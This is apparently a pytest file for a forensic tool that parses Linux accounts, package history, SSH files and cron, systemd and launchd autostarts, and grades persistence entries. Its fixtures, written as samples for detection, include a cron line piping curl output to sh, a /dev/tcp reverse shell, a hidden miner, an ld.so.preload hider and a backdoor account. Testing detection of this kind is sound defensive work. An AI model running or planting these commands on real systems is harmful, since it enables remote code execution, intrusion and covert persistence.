"""Linux system facts, accounts, software history and SSH
(core/activity/linux_system.py), and Linux / macOS autostarts
(core/persistence_unix.py).

The parsers are given the formats as the tools write them -- dnf5's
schema, apt's history.log, crontab, systemd units, launchd plists -- and
Fedora 44's cloud image (local only) is read end to end."""

import datetime
import plistlib
import sqlite3

import pytest

from tests.conftest import image_path

UTC = datetime.timezone.utc


def test_accounts_root_users_and_service_accounts_with_passwords():
    from trace_app.core.activity.linux_system import parse_accounts
    passwd = ("root:x:0:0:Super User:/root:/bin/bash\n"
              "daemon:x:1:1:daemon:/usr/sbin:/bin/sh\n"
              "backdoor:x:998:998::/var/tmp:/bin/bash\n"
              "sshd:x:74:74::/usr/share/empty.sshd:/usr/sbin/nologin\n"
              "alice:x:1000:1000:Alice:/home/alice:/bin/zsh\n"
              "nobody:x:65534:65534::/:/bin/sh\n")
    shadow = ("root:!:20565::::::\n"
              "daemon:*:20470::::::\n"
              "backdoor:$6$salt$hash:20500::::::\n"
              "alice:$y$j9T$abc:20400:0:99999:7:::\n")
    group = "wheel:x:10:alice\naudio:x:63:alice\n"
    accounts = {a['name']: a for a in parse_accounts(passwd, shadow, group)}
    # daemon has a shell but is locked; sshd cannot log in; nobody is none.
    assert set(accounts) == {'root', 'backdoor', 'alice'}
    assert accounts['root']['password'] == 'locked'
    assert accounts['backdoor']['password'] == 'set'
    assert accounts['alice']['groups'] == ['wheel', 'audio']
    assert accounts['alice']['changed'] == datetime.datetime(
        2025, 11, 8, tzinfo=UTC)                 # 20400 days after 1970


def _dnf5_history():
    db = sqlite3.connect(':memory:')
    db.executescript("""
        CREATE TABLE trans (id INTEGER PRIMARY KEY, dt_begin INTEGER NOT NULL,
            dt_end INTEGER, rpmdb_version_begin TEXT, rpmdb_version_end TEXT,
            releasever TEXT, user_id INTEGER, cmdline TEXT, comment TEXT,
            state_id INTEGER);
        CREATE TABLE trans_item (id INTEGER PRIMARY KEY, trans_id INTEGER,
            item_id INTEGER, repo_id INTEGER, action_id INTEGER NOT NULL,
            reason_id INTEGER NOT NULL, state_id INTEGER NOT NULL);
        CREATE TABLE pkg_name (id INTEGER PRIMARY KEY, name TEXT);
        CREATE TABLE rpm (item_id INTEGER NOT NULL UNIQUE,
            name_id INTEGER NOT NULL, epoch INTEGER, version TEXT,
            release TEXT, arch_id INTEGER);
        INSERT INTO pkg_name VALUES (1, 'nmap'), (2, 'libpcap'), (3, 'vim');
        INSERT INTO rpm VALUES (10, 1, 0, '7.9', '1', 1),
                               (11, 2, 0, '1.10', '1', 1),
                               (12, 3, 0, '9.1', '1', 1);
        INSERT INTO trans VALUES (1, 1776866330, 1776866343, '', '', '44',
            1000, 'dnf5 install nmap', '', 2);
        INSERT INTO trans_item VALUES (1, 1, 10, 1, 1, 2, 1),
                                      (2, 1, 11, 1, 1, 1, 1);
        INSERT INTO trans VALUES (2, 1776900000, 1776900005, '', '', '44',
            1000, 'dnf5 remove vim', '', 2);
        INSERT INTO trans_item VALUES (3, 2, 12, 1, 5, 2, 1);
    """)
    return db


def test_dnf_history_says_what_was_asked_for():
    from trace_app.core.activity.linux_system import dnf_transactions
    first, second = dnf_transactions(_dnf5_history())
    assert first['command'] == 'dnf5 install nmap'
    assert first['asked'] == ['nmap']           # libpcap was a dependency
    assert (first['installed'], first['removed']) == (2, 0)
    assert first['user'] == 1000
    assert second['asked'] == ['vim'] and second['removed'] == 1


def test_apt_history():
    from trace_app.core.activity.linux_system import apt_history
    text = ("\nStart-Date: 2024-03-05  14:02:11\n"
            "Commandline: apt install nmap\n"
            "Requested-By: alice (1000)\n"
            "Install: libpcap0.8:amd64 (1.10.4-4, automatic), "
            "nmap:amd64 (7.94+git20230807-3)\n"
            "End-Date: 2024-03-05  14:02:15\n\n"
            "Start-Date: 2024-03-06  09:00:00\n"
            "Commandline: apt purge telnet\n"
            "Purge: telnet:amd64 (0.17+2.5-3)\n"
            "End-Date: 2024-03-06  09:00:01\n")
    first, second = apt_history(text)
    assert first['start'] == datetime.datetime(2024, 3, 5, 14, 2, 11)
    assert first['install'] == ['libpcap0.8', 'nmap']
    assert first['user'] == 'alice (1000)'
    assert second['purge'] == ['telnet']


def test_ssh_files():
    from trace_app.core.activity.linux_system import (authorized_keys,
                                                      known_hosts)
    hosts = known_hosts(
        "github.com,140.82.121.4 ssh-ed25519 AAAAC3Nza\n"
        "|1|s8ChbuFyAeSrHbR+TMQAjQo265k=|fK/EemNqTcPSPLEOxQSs+shg5/E= "
        "ssh-rsa AAAAB3\n# comment\n")
    assert hosts == [('github.com', 'ssh-ed25519', False),
                     ('140.82.121.4', 'ssh-ed25519', False),
                     ('|1|s8ChbuFyAeSrHbR+TMQAjQo265k=|fK/EemNqTcPSPLEOxQSs'
                      '+shg5/E=', 'ssh-rsa', True)]
    keys = authorized_keys('command="/bin/backup",no-pty ssh-rsa AAAAB3 '
                           'backup@vault\nssh-ed25519 AAAAC3 alice@laptop\n')
    assert keys == [('ssh-rsa', 'backup@vault',
                     'command="/bin/backup",no-pty'),
                    ('ssh-ed25519', 'alice@laptop', '')]


def test_autostart_parsers():
    from trace_app.core import persistence_unix as unix
    assert unix.cron_lines(
        "SHELL=/bin/bash\n# m h dom mon dow user command\n"
        "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
        "@reboot root /opt/.x/agent\n", system=True) == [
        ('17 * * * *', 'root', 'cd / && run-parts --report /etc/cron.hourly'),
        ('@reboot', 'root', '/opt/.x/agent')]
    assert unix.cron_lines("*/5 * * * * curl -s http://x/a | sh\n") == [
        ('*/5 * * * *', '', 'curl -s http://x/a | sh')]
    assert unix.unit_exec("[Unit]\nDescription=OpenSSH server daemon\n"
                          "[Service]\nExecStart=-/usr/bin/sshd -D $OPTIONS\n"
                          ) == ('/usr/bin/sshd -D $OPTIONS',
                                'OpenSSH server daemon')
    plist = plistlib.dumps({'Label': 'com.evil.agent', 'RunAtLoad': True,
                            'ProgramArguments': ['/Users/a/.agent', '-d']})
    assert unix.launchd_plist(plist) == ('com.evil.agent',
                                         '/Users/a/.agent -d', True, False,
                                         False)
    assert unix.upstart_exec("start on runlevel 2\nrespawn\n"
                             "exec /sbin/getty 38400 tty1\n") == \
        '/sbin/getty 38400 tty1'
    assert unix.target_of("env LANG=C /usr/bin/python3 /opt/s.py") == \
        '/usr/bin/python3'
    assert unix.target_of("sh /etc/init.d/x start") == '/etc/init.d/x'


@pytest.mark.parametrize('entry, grade', [
    ({'location': 'cron', 'command': 'curl -s http://x/a | sh',
      'source': '/var/spool/cron/root', 'user': 'root'}, 'suspicious'),
    ({'location': 'systemd unit', 'command': '/tmp/.x/miner',
      'source': '/etc/systemd/system/multi-user.target.wants/m.service',
      'user': 'system'}, 'suspicious'),
    ({'location': 'cron', 'command': 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      'source': '/etc/crontab', 'user': 'root'}, 'suspicious'),
    ({'location': 'ld.so.preload', 'command': '/lib/libhide.so',
      'source': '/etc/ld.so.preload', 'user': 'every program'},
     'suspicious'),
    ({'location': 'systemd unit', 'command': '/usr/bin/sshd -D',
      'source': '/etc/systemd/system/multi-user.target.wants/sshd.service',
      'user': 'system', 'exists': True}, 'benign'),
    ({'location': 'systemd unit', 'command': '/opt/agent/run',
      'source': '/etc/systemd/system/multi-user.target.wants/a.service',
      'user': 'system', 'exists': True, 'admin_added': True}, 'notable'),
])
def test_grades(entry, grade):
    from trace_app.core import persistence_unix as unix
    item = {'name': 'x', 'detail': {'admin_added': entry.pop(
        'admin_added', None)}, **entry}
    item['target'] = unix.target_of(item['command'])
    assert unix.grade(item)[0] == grade


def test_fedora_system_accounts_software_and_autostarts():
    """Fedora 44: its release through the /etc/os-release link, the time
    zone, root, the two dnf5 transactions that built the image, and the
    enabled systemd units -- each started program found through
    merged-/usr links (/usr/sbin is /usr/bin)."""
    from trace_app.core import activity, persistence
    from trace_app.core.image_handler import ImageHandler
    handler = ImageHandler(image_path(
        'Fedora-Cloud-Base-Generic-44-1.7.x86_64.qcow2'))
    try:
        (volume,) = activity.Volume.all(handler, 210944)
        assert volume.lookup('/usr/sbin/sshd').path == '/root/usr/bin/sshd'
        assert volume.lookup('/etc/os-release').path == \
            '/root/usr/lib/os-release'
        records = activity.collect(handler)
        by = {(r['source'], r['what']): r for r in records}
        assert by[('os-release', 'Operating system')]['subject'] == \
            'Fedora Linux 44 (Cloud Edition)'
        assert by[('time zone', 'Time zone')]['subject'] == 'UTC'
        assert by[('passwd', 'User account')]['subject'] == 'root'
        installs = [r for r in records if r['source'] == 'dnf5 history']
        assert [r['detail']['installed'] for r in installs] == [186, 246]
        assert 'fedora-release-cloud' in installs[0]['subject']
        autostarts = persistence.collect(handler)
        units = {i['name']: i for i in autostarts
                 if i['location'] == 'systemd unit'}
        assert units['sshd.service']['exists'] is True
        assert units['sshd.service']['target_path'] == '/root/usr/bin/sshd'
        assert all(i['grade'] == 'benign' for i in autostarts)
    finally:
        handler.close_resources()
